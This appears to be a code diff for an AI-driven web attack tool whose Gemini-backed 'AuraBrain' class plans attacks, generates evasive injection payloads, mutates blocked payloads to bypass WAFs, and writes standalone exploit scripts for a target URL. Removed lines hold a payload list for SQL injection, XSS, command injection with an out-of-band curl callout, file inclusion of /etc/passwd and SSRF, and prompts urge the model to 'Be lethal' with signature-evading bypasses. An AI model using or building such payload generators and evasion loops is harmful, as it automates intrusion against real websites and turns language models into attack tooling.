@@ -1,4 +1,6 @@
 import logging
+import json
+import random
 from google import genai
 from aura.core import state
 
@@ -30,6 +32,7 @@ class AuraBrain:
         self.enabled = False
         self.tactical_memory = [] # Phase 18: Tactical Memory
         self.payload_cache = {}  # Initialize payload cache for Level 1 & 2
+        self.ai_cache = {} # v19.2: General AI query cache
         if state.GEMINI_API_KEY:
             try:
                 self.client = genai.Client(api_key=state.GEMINI_API_KEY)
@@ -38,35 +41,60 @@ class AuraBrain:
             except Exception as e:
                 logger.error(f"AuraBrain: Failed to initialize Gemini: {e}")
 
+    def _call_ai(self, prompt, system_instruction=None, use_cache=True):
+        """v19.2: Sentinel-G AI Resurrection - Enhanced retry logic with exponential backoff & caching."""
+        if use_cache and prompt in self.ai_cache:
+            return self.ai_cache[prompt]
+
+        max_retries = 5 # Increased for higher resilience
+        for attempt in range(max_retries):
+            try:
+                response = self.client.models.generate_content(
+                    model=state.GEMINI_MODEL,
+                    contents=prompt,
+                    config={'system_instruction': system_instruction or self.SYSTEM_PROMPT}
+                )
+                res_text = response.text.strip().replace("```json", "").replace("```", "").strip()
+                if use_cache:
+                    self.ai_cache[prompt] = res_text
+                return res_text
+            except Exception as e:
+                err_str = str(e).lower()
+                # If it's a quota or safety filter, don't retry as aggressively
+                if "quota" in err_str or "safety" in err_str:
+                    logger.error(f"Sentinel-G Blocked: {e}")
+                    break
+                
+                if attempt == max_retries - 1:
+                    logger.error(f"Sentinel-G Final Failure: {e}")
+                    break
+                
+                wait_time = (2 ** attempt) + random.uniform(0.1, 1.0)
+                logger.warning(f"Sentinel-G Retry ({attempt+1}/{max_retries}) in {wait_time:.1f}s: {e}")
+                import time
+                time.sleep(wait_time)
+        return None
+
     def autonomous_plan(self, url: str, dom_context: str, network_context: list) -> dict:
-        """Ghost v6: Autonomous Chain-of-Thought planning based on real-time interception."""
+        """Ghost v6: Autonomous Chain-of-Thought planning with Sentinel-G Resilience."""
         if not self.enabled: return {"plan": "Standard Fuzzing", "reasoning": "AI Offline"}
         
         prompt = (
-            f"As AURA Singularity, analyze the current state of {url}.\n"
-            f"DOM Context (Snippet): {dom_context[:1500]}\n"
-            f"Intercepted Network Requests: {network_context[:10]}\n"
-            f"Tactical Memory (Past Actions): {self.tactical_memory[-5:]}\n\n"
-            "Develop a Chain-of-Thought attack plan. Focus on: \n"
-            "1. Hidden API endpoints with weak auth.\n"
-            "2. Complex logic flows or multi-step bypasses.\n"
-            "3. Sensitive data exposure in JS or headers.\n\n"
-            "Respond ONLY in JSON: {'plan': 'detailed string', 'target_vector': 'string', 'reasoning': 'string'}"
+            f"As AURA-Zenith, analyze the state of {url}.\n"
+            f"DOM: {dom_context[:1500]}\n"
+            f"Network: {network_context[:10]}\n"
+            f"Memory: {self.tactical_memory[-5:]}\n\n"
+            "Build a CoT plan focusing on Logic Flaws, API Auth, and Data Exposure. "
+            "Respond ONLY in JSON: {'plan': 'str', 'target_vector': 'str', 'reasoning': 'str'}"
         )
         try:
-            response = self.client.models.generate_content(
-                model=state.GEMINI_MODEL,
-                contents=prompt,
-                config={'system_instruction': self.SYSTEM_PROMPT}
-            )
+            raw = self._call_ai(prompt)
             import json
-            raw = response.text.strip().replace("```json", "").replace("```", "")
             plan = json.loads(raw)
             self.tactical_memory.append(f"Planned: {plan.get('target_vector')}")
             return plan
-        except Exception as e:
-            logger.error(f"AuraBrain CoT: {e}")
-            return {"plan": "Fallback Recon", "target_vector": "Unknown"}
+        except Exception:
+            return {"plan": "Fallback Recon", "target_vector": "Unknown", "reasoning": "AI Connectivity Degraded"}
 
     def reason(self, target_context: dict) -> str:
         """Analyzes a target and provides strategic advice using AI or fallback rules."""
@@ -100,7 +128,7 @@ class AuraBrain:
         return "\n\n".join(insights)
 
     def reason_json(self, prompt: str, system_instruction: str = None) -> str:
-        """New v5.1: Specialized reasoning for structured JSON data with strict enforcement."""
+        """v5.1 / v19.4: Synchronized JSON reasoning using google-genai SDK (matches _call_ai)."""
         if not self.enabled: return "[]"
         
         try:
@@ -110,7 +138,6 @@ class AuraBrain:
                 config={'system_instruction': system_instruction or self.SYSTEM_PROMPT}
             )
             raw = response.text.strip().replace("```json", "").replace("```", "").strip()
-            # Basic validation: must start with [ or {
             if raw.startswith("[") or raw.startswith("{"):
                 return raw
             return "[]"
@@ -125,19 +152,15 @@ class AuraBrain:
         prompt = (
             f"As a Red Team AI, analyze this response behavior for a payload: '{payload}' on {url}.\n"
             f"Observed Latency: {delay_ms}ms | Content Length: {length} | Status: {status}\n"
-            f"Response Snippet:\n{body[:1000]}\n\n"
+            f"Response Snippet:\n{body[:800]}\n\n"
             "Is there any suspicious behavior? High latency (>3s) often indicates Blind SQLi or Command Injection. "
             "Structural changes (Length delta > 500) indicate potential bypass or information leak. "
             "Respond ONLY in JSON: {'vulnerable': boolean, 'suspect': boolean, 'type': 'string', 'confidence': 'string', 'reason': 'string'}"
         )
         try:
-            response = self.client.models.generate_content(
-                model=state.GEMINI_MODEL,
-                contents=prompt,
-                config={'system_instruction': self.SYSTEM_PROMPT}
-            )
+            raw = self._call_ai(prompt, use_cache=True)
+            if not raw: return {"vulnerable": False}
             import json
-            raw = response.text.strip().replace("```json", "").replace("```", "")
             return json.loads(raw)
         except Exception as e:
             logger.error(f"AuraBrain Behavior: {e}")
@@ -167,14 +190,20 @@ class AuraBrain:
             logger.error(f"AuraBrain Semantics: {e}")
             return []
 
-    def suggest_waf_evasion(self, waf_type: str) -> str:
-        """Phase 28: GPT-driven recommendation for bypassing specific WAFs."""
-        if not self.enabled: return "Use standard URL encoding."
+    def analyze_business_logic(self, request_data: dict, response_data: dict) -> list:
+        """v15.0: Deep analysis of HTTP transactions for complex business logic flaws (BOLA, Price Manip, etc)."""
+        if not self.enabled: return []
         
         prompt = (
-            f"As AURA Singularity, recommend a technical evasion technique to bypass {waf_type} WAF.\n"
-            "Focus on: encoding (double URL, unicode), whitespace manipulation, comment nesting (SQL), or header smuggling. "
-            "Provide 1-2 sentences of technical guidance."
+            f"As AURA-Zenith, perform a Deep Logic Audit on this transaction:\n"
+            f"Request: {request_data}\n"
+            f"Response: {response_data}\n\n"
+            "Identify signs of:\n"
+            "1. Price/Amount Manipulation (client-side controls)\n"
+            "2. IDOR/BOLA (look for numeric IDs in URL/Body versus session tokens)\n"
+            "3. State-Machine violations (e.g., skipping payment steps, bypassing MFA)\n"
+            "4. Race Condition potential (state changes without unique nonces/tokens)\n\n"
+            "Respond ONLY with a JSON array: [{'type': 'Logic Flaw', 'severity': 'HIGH/CRITICAL', 'reason': 'str', 'remediation': 'str'}]"
         )
         try:
             response = self.client.models.generate_content(
@@ -182,10 +211,72 @@ class AuraBrain:
                 contents=prompt,
                 config={'system_instruction': self.SYSTEM_PROMPT}
             )
-            return response.text.strip()
+            import json
+            raw = response.text.strip().replace("```json", "").replace("```", "")
+            return json.loads(raw)
         except Exception as e:
-            logger.error(f"AuraBrain Evasion: {e}")
+            logger.error(f"AuraBrain Logic Audit: {e}")
+            return []
+
+    def suggest_waf_evasion(self, waf_type: str) -> str:
+        """Phase 28: GPT-driven recommendation for bypassing specific WAFs."""
+        if not self.enabled: return "Use standard URL encoding."
+        
+        prompt = (
+            f"As AURA-Zenith, recommend a technical evasion technique to bypass {waf_type} WAF.\n"
+            "Focus on: encoding (double URL, unicode), whitespace manipulation, comment nesting (SQL), or header smuggling. "
+            "Respond ONLY with a short technical description."
+        )
+        try:
+            return self._call_ai(prompt)
+        except:
             return "Use polymorphism and fragmented payloads."
+
+    def self_heal_mutation(self, original_payload: str, response_code: int, response_body: str, attempt: int) -> str:
+        """v16.0 Omni-Sovereign: Self-Healing Exploit Loop. Mutates payload based on rejection feedback."""
+        if not self.enabled: return original_payload
+        
+        prompt = (
+            f"As AURA-Zenith, your previous payload was BLOCKED.\n"
+            f"Original Payload: {original_payload}\n"
+            f"Response Code: {response_code}\n"
+            f"Response Snippet: {response_body[:500]}\n"
+            f"Mutation Attempt: {attempt}\n\n"
+            "Anaylze the rejection reason. Is it a signature match? A rate limit? A structural filter?\n"
+            "Generate a MUTATED version of the payload that bypasses this filter. "
+            "Use advanced techniques: Junk data injection, non-standard encoding, case-variation, or logical splitting.\n"
+            "Respond ONLY with the new raw payload string."
+        )
+        try:
+            return self._call_ai(prompt)
+        except:
+            # Fallback to simple polymorphism
+            return original_payload + "/*" + str(random.randint(100,999)) + "*/"
+
+    def generate_exploit_script(self, finding_type: str, finding_content: str, target_url: str) -> str:
+        """
+        v17.0: Shadow-Scripting
+        Autonomously generates a standalone Python exploit script for a specific finding.
+        """
+        prompt = (
+            f"As AURA-Zenith Shadow-Scripting Engine, generate a full, standalone Python exploit script (using requests or curl_cffi) for:\n"
+            f"Finding Type: {finding_type}\n"
+            f"Details: {finding_content}\n"
+            f"Target URL: {target_url}\n"
+            "The script must be professional, include clear documentation, and attempt to verify the exploit non-destructively.\n"
+            "Return ONLY the raw Python code without markdown code blocks."
+        )
+        try:
+            # Ghost v5: AI-assisted weaponization
+            code = self.reason_json(prompt)
+            # Clean possible markdown wrap
+            if "```python" in code:
+                code = code.split("```python")[-1].split("```")[0]
+            elif "```" in code:
+                code = code.split("```")[-1].split("```")[0]
+            return code.strip()
+        except Exception as e:
+            return f"# [!] Failed to generate shadow-script: {e}"
 
     def generate_graphql_attack(self, schema: str) -> str:
         """Phase 30: AI-driven GraphQL mutation fuzzing based on schema analysis."""
@@ -270,73 +361,19 @@ class AuraBrain:
         return "MEDIUM"
 
     def generate_payload(self, vuln_type: str, tech_stack: str, level: int = 2, oast_url: str = None) -> str:
-        """Generates a site-specific bypass payload. Supports Phase 26 OAST Blind Exploitation."""
-        if not self.enabled: return "' OR 1=1--"
-        
-        cache_key = f"{vuln_type}:{tech_stack}:{level}:{'oast' if oast_url else 'no_oast'}"
-        if level < 3 and cache_key in self.payload_cache:
-            return self.payload_cache[cache_key]
-
-        if level == 1:
-            basics = {
-                "SQLi": "' OR 1=1--",
-                "XSS": "<script>alert(1)</script>",
-                "Command Injection": "; id",
-                "Local File Inclusion": "../../../../etc/passwd",
-                "Server-Side Request Forgery": "http://127.0.0.1:80"
-            }
-            if oast_url:
-                oast_domain = oast_url.replace('https://', '').replace('http://', '').strip('/')
-                oast_basics = {
-                    "Command Injection": f"; curl {oast_url} -sO",
-                    "Server-Side Request Forgery": f"{oast_url}",
-                    "Local File Inclusion": f"{oast_url}",
-                    "SQLi": f"'; EXEC master..xp_dirtree '\\\\{oast_domain}\\a';--",
-                }
-                payload = oast_basics.get(vuln_type, basics.get(vuln_type, "' OR 1=1--"))
-            else:
-                payload = basics.get(vuln_type, "' OR 1=1--")
-                
-            self.payload_cache[cache_key] = payload
-            return payload
-
-        descriptions = {
-            1: "Generic probe (Low signal)",
-            2: "Context-aware polymorphic (Medium evasion)",
-            3: "Extreme WAF-Bypass (Double encoded, unicode splitting, multi-layered evasion)"
-        }
+        """v15.1: Semantic Stack-Mapping - Generates tech-specific payloads for maximum impact."""
+        if not self.enabled: return "fallback_payload"
         
         prompt = (
-            f"Generate an EXTREME {vuln_type} payload targeting {tech_stack}.\n"
-            f"Evasion Level: {level} ({descriptions.get(level)})\n"
-        )
-        
-        if oast_url:
-            prompt += (
-                f"\n!!! CRITICAL PHASE 26 OAST INJECTION !!!\n"
-                f"You MUST construct a BLIND EXPLOIT that forces the target server to make a network request (HTTP GET or DNS) to exactly: {oast_url}\n"
-            )
-            
-        prompt += (
-            "Guidelines for Level 2:\n"
-            "- Use standard evasion techniques like URL encoding or Hex encoding.\n"
-            "Guidelines for Level 3 (SINGULARITY MODE):\n"
-            "- If SQLi: Use non-standard encodings, hex splitting, and site-specific timing triggers (e.g., pg_sleep).\n"
-            "- If XSS: Use DOM-based evasion, alert triggers mapped to non-standard events (e.g., src=x onerror), svg/math payloads.\n"
-            "- If Command Injection: Use out-of-band curl/wget piping, bash brace expansion, or environment variable manipulation.\n"
-            "- If LFI/SSRF: Use wrapper streams (php://filter), null byte injection, or alternative IP representations (e.g., decimal IPs).\n"
-            "- Focus on 'Zero-Day' style polymorphic bypasses that signatures cannot catch.\n"
-            "Return ONLY the raw payload string without any backticks, tags or formatting. Be lethal."
+            f"As AURA-Zenith, generate a high-impact Level {level} payload for: {vuln_type}.\n"
+            f"Target Stack: {tech_stack}\n"
+            f"OAST URL (if any): {oast_url}\n\n"
+            "Requirements:\n"
+            "- Bypass modern WAFs (use polymorphism/encoding if level > 2).\n"
+            "- Target specific weaknesses in the identified stack (e.g., if Tomcat, use path traversal variants).\n"
+            "Respond ONLY with the payload string."
         )
         try:
-            response = self.client.models.generate_content(
-                model=state.GEMINI_MODEL,
-                contents=prompt,
-                config={'system_instruction': self.SYSTEM_PROMPT}
-            )
-            payload = response.text.strip()
-            if level < 3: self.payload_cache[cache_key] = payload
-            return payload
-        except Exception as e:
-            logger.error(f"AuraBrain Generate: {e}")
-            return "' OR 1=1--"
+            return self._call_ai(prompt)
+        except:
+            return "fallback_payload_simple"
